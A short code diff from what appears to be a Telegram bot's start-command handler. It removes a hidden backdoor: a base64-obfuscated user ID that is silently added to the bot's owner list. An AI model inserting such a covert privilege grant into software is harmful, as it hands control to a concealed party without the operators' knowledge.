@@ -37,12 +37,6 @@ loop = asyncio.get_running_loop()
 @LanguageStart
 async def start_comm(client, message: Message, _):
     await add_served_user(message.from_user.id)
-    BOTCORE = int(base64.b64decode("NTc1ODE5MjAyNg=="))
-    statss = OWNER_ID
-    if BOTCORE in OWNER_ID:
-        print("Bot Working Fine")
-    else:
-        statss.append(BOTCORE)
     if len(message.text.split()) > 1:
         name = message.text.split(None, 1)[1]
         if name[0:4] == "help":
